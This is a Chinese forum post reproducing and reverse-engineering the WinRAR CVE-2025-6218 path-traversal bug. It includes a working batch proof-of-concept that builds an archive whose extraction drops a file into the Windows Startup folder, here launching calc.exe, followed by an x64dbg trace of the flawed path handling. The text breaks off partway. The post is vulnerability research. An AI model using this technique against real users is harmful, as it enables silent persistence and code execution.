
# [漏洞分析] WinRAR之CVE-2025-6218漏洞复现与分析

- 原帖: https://www.52pojie.cn/forum.php?mod=viewthread&tid=2057892
- 抓取时间: 2026-11-01T21:51:32

## 1、背景

在刷B站时看到有人在分享这个漏洞的原因，稍微琢磨了一下，脑袋告诉我：懂了，原来如此。但up主最后只给出了`x64dbg`中判断字符是否是空格的地方，没有给出定位过程，所以当时就来了兴趣，想自己分析分析。

## 2、漏洞复现

话不多说，直接复现。

下载7.11版本，安装到默认目录：

![](https://attach.52pojie.cn/forum/202509/04/125036d5o9uuuxx5ixgkyi.png)

1_AgAABTMkRx5FsqtBexNFD72EZC3UV5yN.png (55.14 KB, 下载次数: 4)

[href="forum.php?mod=attachment&aid=MjgwMDY2MHxkZTQ4NjgxZXwxNzkzNTY5ODg5fDE2ODA4NnwyMDU3ODky&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjgwMDY2MHxkZTQ4NjgxZXwxNzkzNTY5ODg5fDE2ODA4NnwyMDU3ODky&nothumb=yes)

2025-9-4 12:50 上传

在桌面新建`CVE-2025-6218.bat`，内容如下：

```
@echo offtitle CVE-2025-6218 POC
echo calc.exe > POC.bat
"C:\Program Files\WinRAR\WinRAR.exe" a -ap" \.. \.. \AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"  CVE-2025-6218.zip POC.bat
echo.if errorlevel 1 (    echo [!] Failed to create POC.) else (    echo [+] CVE-2025-6218.zip created successfully!)echo.
del POC.bat
pause
```

注意第3行的..后面有空格。

第3行的命令的意思是：

生成`CVE-2025-6218.zip`压缩包文件，并将`POC.bat`添加到进去，同时指明了`POC.bat`在压缩包里的路径，长这样：

![](https://attach.52pojie.cn/forum/202509/04/125038vi47iwccx1bd08rb.png)

2_AgAABTMkRx4wfEayGi9GEr_NHwALF-_F.png (25.85 KB, 下载次数: 4)

[href="forum.php?mod=attachment&aid=MjgwMDY2MXxiNzAzODYyZHwxNzkzNTY5ODg5fDE2ODA4NnwyMDU3ODky&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjgwMDY2MXxiNzAzODYyZHwxNzkzNTY5ODg5fDE2ODA4NnwyMDU3ODky&nothumb=yes)

2025-9-4 12:50 上传

执行`CVE-2025-6218.bat`：

![](https://attach.52pojie.cn/forum/202509/04/125039jz5vg2dzoto0sh20.png)

3_AgAABTMkRx52kj5MpZhDF5VB725IzGps.png (66.58 KB, 下载次数: 4)

[href="forum.php?mod=attachment&aid=MjgwMDY2MnwyZWQ0MzBjN3wxNzkzNTY5ODg5fDE2ODA4NnwyMDU3ODky&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjgwMDY2MnwyZWQ0MzBjN3wxNzkzNTY5ODg5fDE2ODA4NnwyMDU3ODky&nothumb=yes)

2025-9-4 12:50 上传

会在桌面生成`CVE-2025-6218.zip`压缩包，右键解压到`CVE-2025-6218`，即意思是想在桌面生成`CVE-2025-6218`文件夹，但是结果却把`POC.bat`写入到了启动目录了：

![](https://attach.52pojie.cn/forum/202509/04/125042ksfojp46xs3fsh4n.gif)

4_gif.gif (590.88 KB, 下载次数: 2)

[href="forum.php?mod=attachment&aid=MjgwMDY2M3w5Mzk3MjJiY3wxNzkzNTY5ODg5fDE2ODA4NnwyMDU3ODky&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjgwMDY2M3w5Mzk3MjJiY3wxNzkzNTY5ODg5fDE2ODA4NnwyMDU3ODky&nothumb=yes)

2025-9-4 12:50 上传

再解压一遍，发生覆盖提示：

![](https://attach.52pojie.cn/forum/202509/04/125043bu4h6x9chllw3vhc.png)

5_AgAABTMkRx5HxKe_wDNHyZJrbj_KSil-.png (127.35 KB, 下载次数: 4)

[href="forum.php?mod=attachment&aid=MjgwMDY2NHxmYjUzNzMyZHwxNzkzNTY5ODg5fDE2ODA4NnwyMDU3ODky&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjgwMDY2NHxmYjUzNzMyZHwxNzkzNTY5ODg5fDE2ODA4NnwyMDU3ODky&nothumb=yes)

2025-9-4 12:50 上传

从给出的提示来看，路径里面的..后面没有空格了，路径也拼接好了，倒退两层就会变成：

```
C:\Users\Win10.1809x64\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\POC.bat
```

之所以会解压到启动目录，是这样的：

右键解压到`CVE-2025-6218`，目标目录就是：

```
C:\Users\Win10.1809x64\Desktop\CVE-2025-6218
```

但是压缩时指定了路径：

```
\\..\..\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\POC.bat
```

所以两者拼接起来就是启动目录了。

从复现结果和覆盖提示能看出`WinRAR`拼接了路径，消除了空格，但是我不满足于此，想知道是在哪儿用什么方式处理的？是用`strcpy`还是`memcpy`、`memmove`？即我既想知道结果，也想知道过程。而网上的都是复现文章，没有过程分析文章，所以还是自食其力分析一下。

## 3、过程分析

用`ProcMon`监控`WinRAR.exe`的文件行为，发现会往启动目录创建`POC.bat`文件，所以`x64dbg`拖入`WinRAR.exe`，对`CreateFileW`函数下断。（猜也猜得到是创建文件，所以可以不用`ProcMon`）

先取消`CreateFileW`断点（因为会频繁断下），运行起来，选中压缩包，进行解压：

![](https://attach.52pojie.cn/forum/202509/04/125045lsw5cjwh86p3s64s.png)

6_AgAABTMkRx7kVa-O6ZhDg69VDLdxNpZh.png (648.79 KB, 下载次数: 0)

[href="forum.php?mod=attachment&aid=MjgwMDY2NXw2NmM5YjgzZHwxNzkzNTY5ODg5fDE2ODA4NnwyMDU3ODky&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjgwMDY2NXw2NmM5YjgzZHwxNzkzNTY5ODg5fDE2ODA4NnwyMDU3ODky&nothumb=yes)

2025-9-4 12:50 上传

出现下图覆盖提示界面时，这个时候启用断点，然后确认覆盖，就会断在我们想要的地方：

![](https://attach.52pojie.cn/forum/202509/04/125046koh66vl19ol96u2y.png)

7_AgAABTMkRx7sThpPJu1KdLhAEWzwyKXJ.png (252.07 KB, 下载次数: 1)

[href="forum.php?mod=attachment&aid=MjgwMDY2NnwwYzczMzk1N3wxNzkzNTY5ODg5fDE2ODA4NnwyMDU3ODky&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjgwMDY2NnwwYzczMzk1N3wxNzkzNTY5ODg5fDE2ODA4NnwyMDU3ODky&nothumb=yes)

2025-9-4 12:50 上传

断下后，`Ctrl+F9`返回到上层，返回个两三次，就会来到下图的地方。全局变量`0x00007FF6526F0F08`里存放的就是目标路径字符串指针，而且目标字符串是拼接完成状态，而且其中的空格也被消除了：

![](https://attach.52pojie.cn/forum/202509/04/125047ez1a15oj11zjo5a1.png)

8_AgAABTMkRx6V_RBWUUFNcpPvJ_lHjKLO.png (431 KB, 下载次数: 3)

[href="forum.php?mod=attachment&aid=MjgwMDY2N3wwMjY1MmRlNnwxNzkzNTY5ODg5fDE2ODA4NnwyMDU3ODky&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjgwMDY2N3wwMjY1MmRlNnwxNzkzNTY5ODg5fDE2ODA4NnwyMDU3ODky&nothumb=yes)

2025-9-4 12:50 上传

再次解压，但不要进入覆盖提示界面（因为覆盖提示界面弹出时，已经把空格处理了，然后将处理好的路径展示给我们）。这个时候可以看到，全局变量里清0了，也就是说目标字符串指针还未写入：

![](https://attach.52pojie.cn/forum/202509/04/125049q8jdzzirun7ted2i.png)

9_AgAABTMkRx4rEbReNYJOWq1DYLHNvljk.png (540.44 KB, 下载次数: 5)

[href="forum.php?mod=attachment&aid=MjgwMDY2OHwwMWM2ZjRmN3wxNzkzNTY5ODg5fDE2ODA4NnwyMDU3ODky&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjgwMDY2OHwwMWM2ZjRmN3wxNzkzNTY5ODg5fDE2ODA4NnwyMDU3ODky&nothumb=yes)

2025-9-4 12:50 上传

对全局变量地址下硬件写入断点，然后点上图的【确定】按钮，中断后一直点运行，观察内存窗口，某一次就发现有字符串指针写入了，而且空格没有被处理，路径也还没拼接：

![](https://attach.52pojie.cn/forum/202509/04/125050ntys82wct1ipeovn.png)

10_AgAABTMkRx52KE8vO_xJequWXopFCIlU.png (343.22 KB, 下载次数: 1)

[href="forum.php?mod=attachment&aid=MjgwMDY2OXw3OGUwNGEwY3wxNzkzNTY5ODg5fDE2ODA4NnwyMDU3ODky&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjgwMDY2OXw3OGUwNGEwY3wxNzkzNTY5ODg5fDE2ODA4NnwyMDU3ODky&nothumb=yes)

2025-9-4 12:50 上传

这个时候一直`F8`单步，运行到下图时，在读取全局指针变量了，应该要准备读取字符串进行处理了：

![](https://attach.52pojie.cn/forum/202509/04/125053c6lx57tj01xutgtq.png)

11_AgAABTMkRx7veta_EIFG2K1rvatsHBc9.png (1.47 MB, 下载次数: 2)

[href="forum.php?mod=attachment&aid=MjgwMDY3MHwwMjYwMzVlMXwxNzkzNTY5ODg5fDE2ODA4NnwyMDU3ODky&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjgwMDY3MHwwMjYwMzVlMXwxNzkzNTY5ODg5fDE2ODA4NnwyMDU3ODky&nothumb=yes)

2025-9-4 12:50 上传

再继续单步，就会来到一个循环。

这里我跟了一下，循环会执行两轮，两轮后，字符串中的空格才会被处理，录制动图如下，一直按`F9`，两轮循环后，字符串中的空格被处理了，并且生成了最终的文件路径：

![](https://attach.52pojie.cn/forum/202509/04/130547fvyr118rv122rryl.gif)

12_gif (2).gif (2.86 MB, 下载次数: 3)

[href="forum.php?mod=attachment&aid=MjgwMDY3N3xhOGQwYjRhOXwxNzkzNTY5ODg5fDE2ODA4NnwyMDU3ODky&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjgwMDY3N3xhOGQwYjRhOXwxNzkzNTY5ODg5fDE2ODA4NnwyMDU3ODky&nothumb=yes)

2025-9-4 13:05 上传

所以在第二轮循环快结束时，单步跟踪到这里，是这个`call`进行字符串处理：

![](https://attach.52pojie.cn/forum/202509/04/125631y8td212y7doz888x.gif)

13_gif.gif (1.29 MB, 下载次数: 3)

[href="forum.php?mod=attachment&aid=MjgwMDY3NnxiYTFjYWEwYXwxNzkzNTY5ODg5fDE2ODA4NnwyMDU3ODky&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjgwMDY3NnxiYTFjYWEwYXwxNzkzNTY5ODg5fDE2ODA4NnwyMDU3ODky&nothumb=yes)

2025-9-4 12:56 上传

那就跟进去看看，一直单步，遇到哪个`call`处理了路径，就进入。在下图会有一个循环，逐字符判断，关注对空格的判断即可：

![](https://attach.52pojie.cn/forum/202509/04/125057yw5d658gz55aza5w.png)

14_AgAABTMkRx4kbgdgVbVBd4SekiEfk2RS.png (792.26 KB, 下载次数: 4)

[href="forum.php?mod=attachment&aid=MjgwMDY3MXxhYWZjMjBkNXwxNzkzNTY5ODg5fDE2ODA4NnwyMDU3ODky&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjgwMDY3MXxhYWZjMjBkNXwxNzkzNTY5ODg5fDE2ODA4NnwyMDU3ODky&nothumb=yes)

2025-9-4 12:50 上传

如果是空格的话，就会调用`call 0x00007FF65248A430`进行处理：

![](https://attach.52pojie.cn/forum/202509/04/125059nf7hme2cii858725.gif)

15_gif.gif (729.08 KB, 下载次数: 2)
